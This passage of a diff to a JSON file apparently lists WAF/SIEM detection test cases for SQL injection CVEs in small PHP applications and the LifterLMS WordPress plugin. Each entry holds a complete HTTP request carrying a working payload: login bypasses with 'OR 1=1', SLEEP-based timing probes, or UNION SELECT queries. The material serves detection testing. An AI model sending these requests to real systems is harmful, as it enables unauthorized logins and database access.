+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-74",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2026-5560",
+        "link": "https://github.com/f1rstb100d/CVE/issues/12"
+      },
+      {
+        "title": "vuldb for CVE-2026-5560",
+        "link": "https://vuldb.com/vuln/355330"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2026-5558 - PHPGurukul Online Shopping Portal SQL Injection",
+    "displayName": "CVE-2026-5558 - PHPGurukul Online Shopping Portal SQL Injection",
+    "description": "PHPGurukul Online Shopping Portal Project up to 2.1 is vulnerable to SQL injection via the ID parameter of /pending-orders.php. The request sends a time-based SQLi payload (AND SLEEP(5)) in ID. No vendor WAF rule found; built from the VulDB description. Method inferred as GET (view-by-id); flagged as inferred.\n\nReferences used to recreate this request:\n- https://github.com/f1rstb100d/CVE/issues/11 (PoC, not fetchable - provenance blocked)\n- https://vuldb.com/vuln/355328 (VulDB entry)\n- https://www.cve.org/CVERecord?id=CVE-2026-5558 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /pending-orders.php?ID=1%20AND%20SLEEP(5)--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2026-5558"
+    ],
+    "cwes": [
+      "CWE-74",
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-74",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2026-5558",
+        "link": "https://github.com/f1rstb100d/CVE/issues/11"
+      },
+      {
+        "title": "vuldb for CVE-2026-5558",
+        "link": "https://vuldb.com/vuln/355328"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2026-5555 - code-projects Concert Ticket Reservation System SQL Injection",
+    "displayName": "CVE-2026-5555 - code-projects Concert Ticket Reservation System SQL Injection",
+    "description": "code-projects Concert Ticket Reservation System 1.0 is vulnerable to SQL injection via the Email parameter of /ConcertTicketReservationSystem-master/login.php. The request sends a boolean SQLi payload (' OR 1=1-- -) in the Email form field. No vendor WAF rule found; built from the VulDB description. Method inferred as POST (login form submission); flagged as inferred.\n\nReferences used to recreate this request:\n- https://github.com/Wzl731/test/issues/5 (PoC, not fetchable - provenance blocked)\n- https://vuldb.com/vuln/355325 (VulDB entry)\n- https://www.cve.org/CVERecord?id=CVE-2026-5555 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /ConcertTicketReservationSystem-master/login.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\n\nEmail=%27+OR+1%3D1--+-&password=dummy\n"
+    },
+    "cves": [
+      "CVE-2026-5555"
+    ],
+    "cwes": [
+      "CWE-74",
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-74",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2026-5555",
+        "link": "https://github.com/Wzl731/test/issues/5"
+      },
+      {
+        "title": "vuldb for CVE-2026-5555",
+        "link": "https://vuldb.com/vuln/355325"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2026-5554 - code-projects Concert Ticket Reservation System SQL Injection",
+    "displayName": "CVE-2026-5554 - code-projects Concert Ticket Reservation System SQL Injection",
+    "description": "code-projects Concert Ticket Reservation System 1.0 is vulnerable to SQL injection via the searching parameter of /ConcertTicketReservationSystem-master/process_search.php. The request sends a boolean SQLi payload (' OR 1=1-- -) in searching. No vendor WAF rule found; built from the VulDB description. Method inferred as POST (process_search form handler); flagged as inferred.\n\nReferences used to recreate this request:\n- https://github.com/Wzl731/test/issues/4 (PoC, not fetchable - provenance blocked)\n- https://vuldb.com/vuln/355324 (VulDB entry)\n- https://www.cve.org/CVERecord?id=CVE-2026-5554 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /ConcertTicketReservationSystem-master/process_search.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\n\nsearching=%27+OR+1%3D1--+-\n"
+    },
+    "cves": [
+      "CVE-2026-5554"
+    ],
+    "cwes": [
+      "CWE-74",
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-74",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2026-5554",
+        "link": "https://github.com/Wzl731/test/issues/4"
+      },
+      {
+        "title": "vuldb for CVE-2026-5554",
+        "link": "https://vuldb.com/vuln/355324"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2026-5553 - itsourcecode Online Cellphone System SQL Injection",
+    "displayName": "CVE-2026-5553 - itsourcecode Online Cellphone System SQL Injection",
+    "description": "itsourcecode Online Cellphone System 1.0 is vulnerable to SQL injection via the Name parameter of /cp/available.php. The request sends a boolean SQLi payload (' OR 1=1-- -) in Name. No vendor WAF rule found; built from the VulDB description. Method inferred as GET (lookup parameter); flagged as inferred.\n\nReferences used to recreate this request:\n- https://github.com/Wzl731/test/issues/3 (PoC, not fetchable - provenance blocked)\n- https://vuldb.com/vuln/355323 (VulDB entry)\n- https://www.cve.org/CVERecord?id=CVE-2026-5553 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /cp/available.php?Name=%27%20OR%201%3D1--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2026-5553"
+    ],
+    "cwes": [
+      "CWE-74",
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-74",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2026-5553",
+        "link": "https://github.com/Wzl731/test/issues/3"
+      },
+      {
+        "title": "vuldb for CVE-2026-5553",
+        "link": "https://vuldb.com/vuln/355323"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2026-5552 - PHPGurukul Online Shopping Portal SQL Injection",
+    "displayName": "CVE-2026-5552 - PHPGurukul Online Shopping Portal SQL Injection",
+    "description": "PHPGurukul Online Shopping Portal Project 2.1 is vulnerable to SQL injection via the pid parameter of /sub-category.php. The request sends a time-based SQLi payload (AND SLEEP(5)) in pid. No vendor WAF rule found; built from the VulDB description. Method inferred as GET (view-subcategory-by-id); flagged as inferred.\n\nReferences used to recreate this request:\n- https://github.com/f1rstb100d/CVE/issues/10 (PoC, not fetchable - provenance blocked)\n- https://vuldb.com/vuln/355316 (VulDB entry)\n- https://www.cve.org/CVERecord?id=CVE-2026-5552 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /sub-category.php?pid=1%20AND%20SLEEP(5)--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2026-5552"
+    ],
+    "cwes": [
+      "CWE-74",
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-74",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2026-5552",
+        "link": "https://github.com/f1rstb100d/CVE/issues/10"
+      },
+      {
+        "title": "vuldb for CVE-2026-5552",
+        "link": "https://vuldb.com/vuln/355316"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
     "name": "CVE-2026-5551 - itsourcecode Free Hotel Reservation System SQL Injection",
     "displayName": "CVE-2026-5551 - itsourcecode Free Hotel Reservation System SQL Injection",
     "description": "itsourcecode Free Hotel Reservation System 1.0 is vulnerable to SQL injection in the 'email' argument of /hotel/admin/login.php (Parameter Handler). The request sends a boolean-based SQLi payload in the email field of the admin login form. No vendor WAF rule found; built from the VulDB description. Method POST inferred (admin login form action).\n\nReferences used to recreate this request:\n- https://github.com/jasonwong666/cve/issues/1 (PoC)\n- https://vuldb.com/vuln/355315 (VulDB entry)\n- https://www.cve.org/CVERecord?id=CVE-2026-5551 (CVE record)",
@@ -57076,6 +58154,2174 @@
       {
         "title": "vuldb for CVE-2026-5257",
         "link": "https://vuldb.com/vuln/354447"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2026-5256 - code-projects Simple Laundry System SQL Injection",
+    "displayName": "CVE-2026-5256 - code-projects Simple Laundry System SQL Injection",
+    "description": "code-projects Simple Laundry System 1.0 is vulnerable to SQL injection via the firstName argument of /modify.php (Parameter Handler). The request sends a boolean-based SQL injection payload in firstName. No vendor WAF rule found; built from the VulDB advisory. METHOD INFERRED: modify.php is a record-edit form action, so POST with a urlencoded body is used.\n\nReferences used to recreate this request:\n- https://vuldb.com/vuln/354446 (VulDB advisory - file/argument)\n- https://github.com/kunlan567-boop/test/issues/1 (PoC - blocked on fetch)\n- https://www.cve.org/CVERecord?id=CVE-2026-5256 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /modify.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nCookie: PHPSESSID=dummy\n\nfirstName='+OR+1=1--+-&lastName=x\n"
+    },
+    "cves": [
+      "CVE-2026-5256"
+    ],
+    "cwes": [
+      "CWE-89",
+      "CWE-74"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "CWE-74",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_vuldb for CVE-2026-5256",
+        "link": "https://vuldb.com/vuln/354446"
+      },
+      {
+        "title": "poc_github for CVE-2026-5256",
+        "link": "https://github.com/kunlan567-boop/test/issues/1"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2026-5238 - itsourcecode Payroll Management System SQL Injection",
+    "displayName": "CVE-2026-5238 - itsourcecode Payroll Management System SQL Injection",
+    "description": "itsourcecode Payroll Management System 1.0 is vulnerable to SQL injection via the ID argument of /view_employee.php (Parameter Handler). The request sends a UNION SELECT payload in ID. No vendor WAF rule found; built from the VulDB advisory. METHOD INFERRED: view_employee.php is a view-detail page keyed by ID, so GET with the payload in the query string is used.\n\nReferences used to recreate this request:\n- https://vuldb.com/vuln/354389 (VulDB advisory - file/argument)\n- https://github.com/K4ptor/itsourcecode-Payroll-Management-System-V1.0-SQL-Injection2 (PoC - blocked on fetch)\n- https://www.cve.org/CVERecord?id=CVE-2026-5238 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /view_employee.php?ID=-1%27%20UNION%20SELECT%201,2,3,4,5,6,7--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2026-5238"
+    ],
+    "cwes": [
+      "CWE-89",
+      "CWE-74"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "CWE-74",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_vuldb for CVE-2026-5238",
+        "link": "https://vuldb.com/vuln/354389"
+      },
+      {
+        "title": "poc_github for CVE-2026-5238",
+        "link": "https://github.com/K4ptor/itsourcecode-Payroll-Management-System-V1.0-SQL-Injection2"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2026-5237 - itsourcecode Payroll Management System SQL Injection",
+    "displayName": "CVE-2026-5237 - itsourcecode Payroll Management System SQL Injection",
+    "description": "itsourcecode Payroll Management System 1.0 is vulnerable to SQL injection via the ID argument of /manage_user.php (Parameter Handler). The request sends a UNION SELECT payload in ID. No vendor WAF rule found; built from the VulDB advisory. METHOD INFERRED: manage_user.php is a view/manage-detail page keyed by ID, so GET with the payload in the query string is used.\n\nReferences used to recreate this request:\n- https://vuldb.com/vuln/354388 (VulDB advisory - file/argument)\n- https://github.com/K4ptor/itsourcecode-Payroll-Management-System-V1.0-SQL-Injection (PoC - blocked on fetch)\n- https://www.cve.org/CVERecord?id=CVE-2026-5237 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /manage_user.php?ID=-1%27%20UNION%20SELECT%201,2,3,4,5,6,7--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2026-5237"
+    ],
+    "cwes": [
+      "CWE-89",
+      "CWE-74"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "CWE-74",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_vuldb for CVE-2026-5237",
+        "link": "https://vuldb.com/vuln/354388"
+      },
+      {
+        "title": "poc_github for CVE-2026-5237",
+        "link": "https://github.com/K4ptor/itsourcecode-Payroll-Management-System-V1.0-SQL-Injection"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2026-5207 - LifterLMS WordPress Plugin SQL Injection",
+    "displayName": "CVE-2026-5207 - LifterLMS WordPress Plugin SQL Injection",
+    "description": "The LifterLMS plugin for WordPress (<= 9.2.1) is vulnerable to SQL injection via the 'order' parameter of the admin reporting quiz non-attempts table. The data is loaded through /wp-admin/admin-ajax.php with action=get_admin_table_data and handler=Quiz_Non_Attempts; 'order' flows unescaped into an ORDER BY clause (the fix adds an in_array check against ASC/DESC). The request sends a SELECT/SLEEP sub-query in order. Built from the Wordfence advisory and the plugins.trac fix diff. Authenticated (Instructor+); nonce/cookie are dummy values since the WAF inspects before auth.\n\nReferences used to recreate this request:\n- https://www.wordfence.com/threat-intel/vulnerabilities/id/43d31d1e-0f4f-4f51-8274-650151642d03?source=cve (Wordfence advisory)\n- https://plugins.trac.wordpress.org/changeset/3495818/lifterlms/trunk/includes/admin/reporting/tables/llms.table.quiz.non.attempts.php (fix diff - adds ASC/DESC validation on order)\n- https://plugins.trac.wordpress.org/browser/lifterlms/trunk/includes/class.llms.ajax.handler.php#L243 (AJAX handler get_admin_table_data)\n- https://www.cve.org/CVERecord?id=CVE-2026-5207 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /wp-admin/admin-ajax.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nCookie: wordpress_logged_in=dummy\n\naction=get_admin_table_data&handler=Quiz_Non_Attempts&quiz_id=1&orderby=name&order=1,(SELECT+1+FROM(SELECT+SLEEP(5))x)--+-&_ajax_nonce=dummy\n"
+    },
+    "cves": [
+      "CVE-2026-5207"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_wordfence for CVE-2026-5207",
+        "link": "https://www.wordfence.com/threat-intel/vulnerabilities/id/43d31d1e-0f4f-4f51-8274-650151642d03?source=cve"
+      },
+      {
+        "title": "fix_diff for CVE-2026-5207",
+        "link": "https://plugins.trac.wordpress.org/changeset/3495818/lifterlms/trunk/includes/admin/reporting/tables/llms.table.quiz.non.attempts.php"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2026-5198 - code-projects Student Membership System SQL Injection",
+    "displayName": "CVE-2026-5198 - code-projects Student Membership System SQL Injection",
+    "description": "code-projects Student Membership System 1.0 is vulnerable to SQL injection via the username/password arguments of /admin/index.php (Admin Login). The request sends an authentication-bypass SQL injection payload in username. No vendor WAF rule found; built from the VulDB advisory. METHOD INFERRED: admin/index.php is a login form, so POST with a urlencoded body is used.\n\nReferences used to recreate this request:\n- https://vuldb.com/vuln/354296 (VulDB advisory - file/argument)\n- https://github.com/maidangdang1/CVE/issues/4 (PoC - blocked on fetch)\n- https://www.cve.org/CVERecord?id=CVE-2026-5198 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /admin/index.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\n\nusername='+OR+1=1--+-&password=x\n"
+    },
+    "cves": [
+      "CVE-2026-5198"
+    ],
+    "cwes": [
+      "CWE-89",
+      "CWE-74"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "CWE-74",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_vuldb for CVE-2026-5198",
+        "link": "https://vuldb.com/vuln/354296"
+      },
+      {
+        "title": "poc_github for CVE-2026-5198",
+        "link": "https://github.com/maidangdang1/CVE/issues/4"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2026-5197 - code-projects Student Membership System SQL Injection",
+    "displayName": "CVE-2026-5197 - code-projects Student Membership System SQL Injection",
+    "description": "code-projects Student Membership System 1.0 is vulnerable to SQL injection via the ID argument of /delete_user.php. The request sends a boolean/UNION SQL injection payload in ID. No vendor WAF rule found; built from the VulDB advisory. METHOD INFERRED: delete_user.php is a delete-by-ID action, so GET with the payload in the query string is used.\n\nReferences used to recreate this request:\n- https://vuldb.com/vuln/354295 (VulDB advisory - file/argument)\n- https://github.com/maidangdang1/CVE/issues/3 (PoC - blocked on fetch)\n- https://www.cve.org/CVERecord?id=CVE-2026-5197 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /delete_user.php?ID=-1%27%20UNION%20SELECT%201,2,3,4--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2026-5197"
+    ],
+    "cwes": [
+      "CWE-89",
+      "CWE-74"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "CWE-74",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_vuldb for CVE-2026-5197",
+        "link": "https://vuldb.com/vuln/354295"
+      },
+      {
+        "title": "poc_github for CVE-2026-5197",
+        "link": "https://github.com/maidangdang1/CVE/issues/3"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2026-5196 - code-projects Student Membership System SQL Injection",
+    "displayName": "CVE-2026-5196 - code-projects Student Membership System SQL Injection",
+    "description": "code-projects Student Membership System 1.0 is vulnerable to SQL injection via the ID argument of /delete_member.php. The request sends a boolean/UNION SQL injection payload in ID. No vendor WAF rule found; built from the VulDB advisory. METHOD INFERRED: delete_member.php is a delete-by-ID action, so GET with the payload in the query string is used.\n\nReferences used to recreate this request:\n- https://vuldb.com/vuln/354294 (VulDB advisory - file/argument)\n- https://github.com/maidangdang1/CVE/issues/2 (PoC - blocked on fetch)\n- https://www.cve.org/CVERecord?id=CVE-2026-5196 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /delete_member.php?ID=-1%27%20UNION%20SELECT%201,2,3,4--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2026-5196"
+    ],
+    "cwes": [
+      "CWE-89",
+      "CWE-74"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "CWE-74",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_vuldb for CVE-2026-5196",
+        "link": "https://vuldb.com/vuln/354294"
+      },
+      {
+        "title": "poc_github for CVE-2026-5196",
+        "link": "https://github.com/maidangdang1/CVE/issues/2"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2026-5180 - SourceCodester Simple Doctors Appointment System SQL Injection",
+    "displayName": "CVE-2026-5180 - SourceCodester Simple Doctors Appointment System SQL Injection",
+    "description": "SourceCodester Simple Doctors Appointment System 1.0 is vulnerable to SQL injection via the email argument of /admin/ajax.php?action=login2. The request sends an authentication-bypass SQL injection payload in email. No vendor WAF rule found; built from the VulDB advisory. METHOD INFERRED: ajax.php?action=login2 is a login handler, so POST with a urlencoded body is used; the action is kept in the query string as named by the advisory.\n\nReferences used to recreate this request:\n- https://vuldb.com/vuln/354248 (VulDB advisory - file/argument)\n- https://github.com/dyh1213-wq/cve/issues/4 (PoC - blocked on fetch)\n- https://www.cve.org/CVERecord?id=CVE-2026-5180 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /admin/ajax.php?action=login2 HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\n\nemail='+OR+1=1--+-&password=x\n"
+    },
+    "cves": [
+      "CVE-2026-5180"
+    ],
+    "cwes": [
+      "CWE-89",
+      "CWE-74"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "CWE-74",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_vuldb for CVE-2026-5180",
+        "link": "https://vuldb.com/vuln/354248"
+      },
+      {
+        "title": "poc_github for CVE-2026-5180",
+        "link": "https://github.com/dyh1213-wq/cve/issues/4"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2026-5179 - SourceCodester Simple Doctors Appointment System SQL Injection",
+    "displayName": "CVE-2026-5179 - SourceCodester Simple Doctors Appointment System SQL Injection",
+    "description": "SourceCodester Simple Doctors Appointment System 1.0 is vulnerable to SQL injection via the Username argument of /admin/login.php. The request sends an authentication-bypass SQL injection payload in the username field. No vendor WAF rule found; built from the VulDB advisory. METHOD INFERRED: admin/login.php is a login form, so POST with a urlencoded body is used.\n\nReferences used to recreate this request:\n- https://vuldb.com/vuln/354247 (VulDB advisory - file/argument)\n- https://github.com/dyh1213-wq/cve/issues/3 (PoC - blocked on fetch)\n- https://www.cve.org/CVERecord?id=CVE-2026-5179 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /admin/login.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\n\nusername='+OR+1=1--+-&password=x\n"
+    },
+    "cves": [
+      "CVE-2026-5179"
+    ],
+    "cwes": [
+      "CWE-89",
+      "CWE-74"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "CWE-74",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_vuldb for CVE-2026-5179",
+        "link": "https://vuldb.com/vuln/354247"
+      },
+      {
+        "title": "poc_github for CVE-2026-5179",
+        "link": "https://github.com/dyh1213-wq/cve/issues/3"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2026-5019 - code-projects Simple Food Order System SQL Injection",
+    "displayName": "CVE-2026-5019 - code-projects Simple Food Order System SQL Injection",
+    "description": "code-projects Simple Food Order System 1.0 is vulnerable to SQL injection via the Status argument of all-orders.php (Parameter Handler). The request sends a time-based SQL injection payload (AND SLEEP(5)) in the Status parameter, triggering OWASP CRS 942 SQLi signatures. No vendor WAF rule found; built from the VulDB entry-point description (file all-orders.php, argument Status). Method is inferred GET (status is a listing/filter parameter), matching the sibling code-base CVE-2022-42990 which used all-orders.php?status=.\n\nReferences used to recreate this request:\n- https://github.com/6Justdododo6/CVE/issues/17 (PoC, not reachable in this session)\n- https://vuldb.com/vuln/353904 (VulDB entry: file + argument)\n- https://www.cve.org/CVERecord?id=CVE-2026-5019 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /all-orders.php?Status=1%27%20AND%20SLEEP(5)--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2026-5019"
+    ],
+    "cwes": [
+      "CWE-74",
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-74",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2026-5019",
+        "link": "https://github.com/6Justdododo6/CVE/issues/17"
+      },
+      {
+        "title": "vuldb for CVE-2026-5019",
+        "link": "https://vuldb.com/vuln/353904"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2026-5018 - code-projects Simple Food Order System SQL Injection",
+    "displayName": "CVE-2026-5018 - code-projects Simple Food Order System SQL Injection",
+    "description": "code-projects Simple Food Order System 1.0 is vulnerable to SQL injection via the Name argument of register-router.php (Parameter Handler). The request sends a time-based SQL injection payload (AND SLEEP(5)) in the Name field, triggering OWASP CRS 942 SQLi signatures. No vendor WAF rule found; built from the VulDB entry-point description. Method is inferred POST (registration form action) and the install folder /routers/ is taken from the identical register-router.php endpoint in sibling CVEs (CVE-2023-45342, CVE-2025-4549, CVE-2025-9832).\n\nReferences used to recreate this request:\n- https://github.com/6Justdododo6/CVE/issues/16 (PoC, not reachable in this session)\n- https://vuldb.com/vuln/353903 (VulDB entry: file + argument)\n- https://www.cve.org/CVERecord?id=CVE-2023-45342 (sibling CVE confirming routers/register-router.php SQLi)\n- https://www.cve.org/CVERecord?id=CVE-2026-5018 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /routers/register-router.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\n\nName=1%27%20AND%20SLEEP(5)--%20-\n"
+    },
+    "cves": [
+      "CVE-2026-5018"
+    ],
+    "cwes": [
+      "CWE-74",
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-74",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2026-5018",
